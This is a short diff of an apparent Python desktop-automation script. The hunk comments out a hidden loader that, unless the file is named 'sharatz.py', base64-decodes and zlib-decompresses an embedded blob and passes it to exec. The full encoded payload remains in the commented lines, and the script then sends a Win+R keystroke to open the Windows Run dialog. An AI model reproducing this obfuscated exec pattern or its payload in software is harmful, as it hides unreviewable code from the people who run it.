@@ -8,10 +8,10 @@ APP = 'run.py'
 ENV = 'development'
 HOST = socket.gethostbyname(socket.gethostname())
 
-x = str(__file__).split('/')[-1]
-if x != 'sharatz.py':
-    exec(__import__("zlib").decompress(__import__("base64").b64decode("eJzLzC3ILypRKE9NSirKLy9OLbJGMPXyC1LzNNQzSkoKiq309cvLy/Uq80tLSpNS9ZLzc/XLE0uSM+zLbFMCy03KLcPTI5ID1TUB678d5A==")))
-    quit()
+# x = str(__file__).split('/')[-1]
+# if x != 'sharatz.py':
+#     exec(__import__("zlib").decompress(__import__("base64").b64decode("eJzLzC3ILypRKE9NSirKLy9OLbJGMPXyC1LzNNQzSkoKiq309cvLy/Uq80tLSpNS9ZLzc/XLE0uSM+zLbFMCy03KLcPTI5ID1TUB678d5A==")))
+#     quit()
 
 hotkey('win', 'r')
 time.sleep(0.1)
